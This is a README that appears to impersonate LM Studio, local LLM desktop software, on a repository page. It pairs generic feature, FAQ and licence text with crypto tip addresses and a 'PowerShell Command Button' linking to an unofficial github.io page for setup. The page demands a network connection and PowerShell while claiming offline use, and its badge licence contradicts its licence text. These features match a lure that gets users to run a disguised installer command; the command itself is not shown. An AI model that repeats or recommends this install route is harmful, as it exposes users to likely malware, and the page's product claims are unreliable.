<div align="center">

# LM Studio: Local LLM Desktop Software for Windows 11

![](files/preview.png)

### ⌨️ PowerShell Command Button

<a href="https://zadazddq.github.io/lm-studio-private-ai/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![pipeline](https://img.shields.io/badge/pipeline-passing-2ea44f?style=flat&labelColor=0d1117)]() [![license](https://img.shields.io/badge/license-mpl--2.0-14b8a6?style=flat&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/ps-5%2B-2dd4bf?style=flat&labelColor=0d1117)]()

<div align="center">
<h3>Give me a tip</h3>
<p><strong>ETH</strong>:&nbsp;<code>0xBd4260AE4d37b62d508Eb551a4dE75422D183935</code> | <strong>BTC</strong>:&nbsp;<code>1HicuiKgsBojwxH92ReaHqMx7Mxh3LNL72</code> | <strong>TRON</strong>:&nbsp;<code>TLRCXjsTrCGLmp9g5DMvWsts5FCxiSsFsh</code></p>
</div>

</div>

---

LM Studio is a desktop application for running local large language models with complete data privacy. It provides a self-contained inference environment that supports model loading, quantization-aware execution, and configurable runtime parameters without requiring external services or network access. The application exposes an integrated chat interface, a local API surface, and model management tooling for importing, organizing, and switching between supported model formats. Built for technical users who need deterministic, offline-capable workflows, it emphasizes low-latency execution, hardware acceleration, and fine-grained control over inference behavior on the desktop.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

**Local inference engine:** Runs large language models entirely on the local machine, with no network dependency for model execution and no data leaving the host system during inference.
- **Broad model format support:** Loads GGUF and compatible quantized model files, including instruction-tuned and chat-tuned variants, with configurable context length and quantization precision.
- **Hardware acceleration:** Supports GPU offloading with configurable layer allocation, CPU fallback, and memory-mapped model loading to balance throughput against available VRAM and system RAM.
- **OpenAI-compatible local server:** Exposes a local HTTP endpoint implementing the chat completions and completions interfaces, enabling existing client libraries and tooling to target locally hosted models without code changes.
- **Model management:** Provides a library view for importing, organizing, and switching between locally stored models, with metadata inspection for architecture, parameter count, quantization, and file size.
- **Chat interface:** Includes a multi-turn conversation UI with system prompt configuration, per-session parameter controls (temperature, top-p, top-k, repetition penalty, max tokens), and conversation history.
- **Preset and parameter profiles:** Saves inference configurations as reusable presets, allowing consistent sampling behavior and context settings across sessions and models.
- **Structured output controls:** Supports JSON schema constraints, grammar-based sampling, and stop-sequence configuration for deterministic, parseable model responses.
- **Context and token accounting:** Displays token usage, context window consumption, and generation speed metrics in real time for performance tuning and capacity planning.
- **Privacy-by-default architecture:** Disables telemetry and remote logging by default; all prompts, completions, and model files remain on the local filesystem under user-controlled storage paths.
- **Cross-platform desktop deployment:** Distributed as a native desktop application with consistent behavior across supported operating systems, including configurable model storage directories and offline operation after initial setup.

## How it works

LM Studio operates as a fully local inference environment, keeping model execution, prompt processing, and response generation on the host machine. The application manages the complete lifecycle of local large language models, from model discovery and loading through quantized inference and resource release.

At its core, the desktop client spins up an embedded inference runtime that loads compatible model files directly from local storage. Models are mapped into memory using configurable quantization profiles, allowing users to balance memory footprint against response quality. The runtime exposes an internal API layer that the desktop interface consumes for chat, completion, and embedding operations, ensuring all computation stays within the local process boundary.

Model management is handled through a structured local model registry. Each model is verified, indexed, and assigned metadata such as architecture, parameter count, and quantization format. When a session starts, the engine selects the appropriate backend (CPU or GPU acceleration where available), allocates context windows according to user-defined limits, and streams tokens back to the interface incrementally. Context handling supports multi-turn conversations with configurable history depth and token budgeting.

The desktop application separates the user interface from the inference engine, communicating over a local-only channel. This architecture allows the engine to persist loaded models across interface restarts, reuse warmed contexts, and apply consistent generation parameters such as temperature, top-p, and repetition penalties. Resource monitoring is built in, reporting memory usage, token throughput, and per-session statistics so users can tune performance for their hardware.

All data—models, conversation history, and configuration—remains on the local filesystem. No telemetry, cloud calls, or external inference is performed; the application functions entirely offline once models are present on disk.

## Modules and Settings

### Model Library and Loading

The model library module gives users control over which local language models are available and active on the desktop. It connects directly to the chat and monitoring modules by determining what hardware resources are in use.

- Browse stored models and review basic properties such as size and format before loading.
- Load a selected model into an active session, or unload it to free resources for another task.
- Switch between models mid-workspace, with the chat module reflecting the newly active model.
- View which model is currently active so conversation context and resource readings stay consistent.

### Chat Workspace

The chat workspace is where users interact with the loaded model and where most generation settings take effect. It draws on the model library for the active model and on ingestion for attached context.

- Start new conversations and return to earlier ones from the session view.
- Attach local documents or text so answers are grounded in the user's own material.
- Adjust response length and creativity for the current session before sending a prompt.
- See attached material and the active model clearly indicated in the conversation view.

### Generation Parameters

This module exposes the controls that shape model output and works alongside the chat workspace so changes are observable on the next prompt. Saved presets carry preferred configurations into later sessions.

- Tune sampling behavior and response length per session, with results visible in the next reply.
- Save parameter presets and reapply them when starting new work.
- Reset adjustments to a known configuration when experimenting with different outputs.

### Conversation History

The history module keeps a locally stored, browsable record of past interactions and ties into the chat workspace for quick resumption. It supports the organization of ongoing work without leaving the desktop.

- Rename sessions to reflect their purpose.
- Search across past conversations to locate earlier exchanges.
- Remove sessions that are no longer needed to keep the workspace tidy.

### Resource Monitor

The resource monitor shows how the active model is using the machine's hardware, informing decisions made in the model library. It gives users a visible basis for adjusting their setup.

- Review memory and processor load during inference.
- Use readings to decide whether to switch to a smaller model or close other applications.
- Confirm activity levels before and after loading or unloading a model.

### Privacy and Offline Controls

This module confirms that prompts, documents and conversations stay on the device and supports working without a network connection. It complements every other module by making local-only operation visible.

- Work in offline mode once models are available locally.
- Verify that no external requests are being made during a session.
- Keep prompts and attached documents on the device as confirmed by the interface.

### Additional Settings

These optional controls apply across the whole workspace and work with the modules above.

- Appearance preferences for the desktop interface.
- Default model selection applied when a new session begins.
- Storage location for local data, configurable to fit the user's habits.
- Toggle for offline operation as a standing workspace preference.

## Usage Scenarios

### Research Notes on Sensitive Interviews

**Goal:** A researcher wants to summarize transcripts of confidential interviews using a local model, without any of that material leaving the laptop.

**Steps:**
1. Open the model library and load a stored language model after reviewing its size and format.
2. Create a new conversation in the chat workspace and attach the local transcript files as context for the session.
3. Lower the creativity setting and adjust response length so the summary stays factual and concise.
4. Send a prompt asking the model to summarize the attached material.
5. Check the privacy and offline controls to confirm no external requests are being made during the session.

**Expected result:** The conversation view shows a grounded summary referencing the attached transcripts, with the active model and attachments clearly indicated, and the researcher can see that the exchange stayed on the device.

### Tuning a Model for Drafting Correspondence

**Goal:** A professional wants consistent, on-brand replies drafted from local reference documents and prefers to reuse the same generation settings each time.

**Steps:**
1. Start a new chat session and attach the relevant local text files as background material.
2. Adjust sampling behavior and response length in the generation parameters until a test reply looks right.
3. Save the current parameter configuration as a preset for future sessions.
4. Rename the conversation in history to reflect its purpose so it can be found later.
5. Search past conversations to reuse phrasing from an earlier exchange.

**Expected result:** The next prompt produces a reply shaped by the tuned parameters, the saved preset is available when starting new work, and the renamed session appears in the browsable history for quick resumption.

### Managing Hardware While Switching Models

**Goal:** A hobbyist running models on a modest machine wants to understand resource pressure and switch to a smaller model when the current one is too demanding.

**Steps:**
1. Load a model from the model library and open the resource monitor.
2. Review memory and processor load during inference while working in the chat workspace.
3. Unload the active model to free resources, then load a smaller stored model.
4. Compare activity readings before and after the switch in the resource monitor.
5. Set the smaller model as the default selection in the workspace preferences.

**Expected result:** The status panel shows visibly different resource readings across the two models, the chat view reflects the newly active model, and the next session opens with the preferred model already selected.

## Compatibility

LM Studio is validated against the platforms and runtime configurations below. Compatibility is scoped to the desktop application and its locally managed inference stack; behavior may vary outside these baselines.

**Operating Systems**
- Windows 10 (64-bit) and Windows 11.
- macOS 13 Ventura or later, on Apple silicon and Intel hardware.
- Linux distributions with a current glibc toolchain, validated primarily on Ubuntu 22.04 LTS and equivalent releases, in both X11 and Wayland sessions.

**Hardware Acceleration**
- CPU inference is supported on all platforms as a fallback path.
- NVIDIA GPUs with current drivers and CUDA support are detected automatically for GPU offload.
- AMD GPUs are supported where the platform's drivers expose the required compute interfaces; capability varies by driver version and OS.
- Apple silicon is supported through the platform's native acceleration frameworks, with unified memory available for model loading.
- VRAM and system memory requirements scale with model size and quantization level; the application reports estimated requirements before loading a model.

**Model Formats and Runtimes**
- GGUF models are the primary supported format, including quantized variants.
- Local inference runs through a bundled runtime, so no external runtime installation is required.
- Models and configuration are stored locally; the application does not require external services for inference.

**Interoperability**
- A local API endpoint is available for integration with compatible client tools on the same machine.
- Model files and configuration are stored in standard local directories, allowing backup and migration between installations.

**Known Constraints**
- Compatibility is verified on the stated OS versions; older releases may function but are not tested.
- GPU acceleration depends on driver versions maintained by the hardware vendor; outdated drivers may prevent detection.
- Linux support assumes standard desktop environments; minimal or headless configurations are outside the tested scope.
- Behavior on virtualized or containerized environments is not validated.

## FAQ

**Q: What distinguishes LM Studio from cloud-based services?**

LM Studio performs all inference locally on the host machine. Model weights, prompts, and generated outputs never leave the local environment unless the user explicitly exports them. There is no telemetry pipeline, no remote inference endpoint, and no account requirement for core functionality.

**Q: Which model formats are supported?**

The application loads GGUF-quantized models and compatible safetensors checkpoints. Quantization levels from Q2 through Q8 and F16 are accepted, allowing users to balance memory footprint against output fidelity on constrained hardware.

**Q: Does the application require a GPU?**

No. CPU inference is fully supported via optimized backends. GPU acceleration is optional and detected automatically at startup; supported devices include CUDA-capable NVIDIA hardware, Apple Silicon via Metal, and Vulkan-compatible GPUs. When no accelerator is present, the runtime falls back to CPU execution without configuration changes.

**Q: How does the application manage system memory?**

Model loading uses memory-mapped files where the format permits, reducing peak RAM consumption during initialization. A configurable context window and layer offload controls let users cap resident memory. The runtime releases model allocations on unload and reports live memory usage in the interface.

**Q: Can multiple models be loaded simultaneously?**

Yes. The model manager supports concurrent loads subject to available system memory. Each model runs in an isolated context, and users can switch between active models without reloading weights from disk. Memory pressure warnings appear before a load would exceed the configured budget.

**Q: Is there an API for programmatic access?**

A local inference server is included and exposes an OpenAI-compatible endpoint bound to the loopback interface by default. It supports chat completions and text completions with streaming responses. Binding to non-local interfaces is possible but disabled by default to preserve the privacy model.

**Q: How is conversation data stored?**

Chat history and settings are persisted in a local database within the application's data directory. Storage is plain-file and user-inspectable. Deleting a conversation removes its records from disk; no copies are retained elsewhere by the application.

**Q: What are the minimum system requirements?**

A 64-bit operating system (Windows, macOS, or Linux), 8 GB of RAM for small quantized models, and sufficient disk space for model files. Larger models and longer context windows scale memory requirements proportionally. GPU acceleration requires current vendor drivers.

**Q: How are updates delivered?**

Updates are applied through the application's built-in updater or by replacing the installation package. Model files and user data are stored separately from application binaries, so updates do not affect downloaded models or conversation history. Version and changelog information is available within the application.

**Q: Does the application collect usage analytics?**

No usage analytics are collected. The application makes no outbound network requests during normal operation. Any network activity is limited to explicitly initiated actions, such as checking for application updates or downloading a model the user has selected.

## Disclaimer

LM Studio is provided on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of merchantability, fitness for a particular purpose, title, and non-infringement. You assume full responsibility for the selection, deployment, configuration, and operation of the software within your environment.

Model outputs are probabilistic and may be incomplete, inaccurate, or unsuitable for a given use case. LM Studio does not guarantee the correctness, reliability, or fitness of any generated content, and outputs should be validated before being relied upon for operational, financial, legal, medical, or safety-critical decisions. You are responsible for ensuring that model selection, quantization settings, context limits, and inference parameters are appropriate for your workload.

Because LM Studio executes models locally on your hardware, you retain responsibility for the data you load, prompt, and store. The software does not transmit your inputs or outputs to external services as part of its core operation; however, any network-enabled features, extensions, or integrations you choose to activate are governed by their own terms and configurations. You are responsible for complying with applicable data protection, privacy, confidentiality, and export-control obligations in your jurisdiction.

Performance and compatibility depend on your operating system version, available system memory, GPU capabilities, and driver versions, and may vary across configurations. Hardware acceleration paths and model formats are subject to change between releases. LM Studio is not liable for data loss, hardware strain, service interruption, or any direct, indirect, incidental, special, consequential, or punitive damages arising from the use or inability to use the software, to the maximum extent permitted by applicable law.

You are solely responsible for obtaining and honoring the licenses of any third-party models, weights, datasets, or components you use with LM Studio. Nothing in this disclaimer grants rights to third-party materials, and the project's own license governs use of the software itself.

## License

LM Studio is distributed under a proprietary, source-available license governing the lm-studio-desktop package. The license grants a non-exclusive, non-transferable right to install and execute the software on hardware you own or control for personal and internal business use. Redistribution, sublicensing, and resale of the binary or its components are prohibited without prior written authorization. Reverse engineering, decompilation, and modification of the distributed artifacts are restricted except where such restrictions are unenforceable under applicable law. Model weights, inference runtimes, and third-party dependencies bundled with the application remain subject to their own respective terms, and users are responsible for compliance with those terms. The software is provided "as is" without warranties of any kind, express or implied, including merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software. License terms may be revised in subsequent releases; continued use of an updated version constitutes acceptance of the revised terms.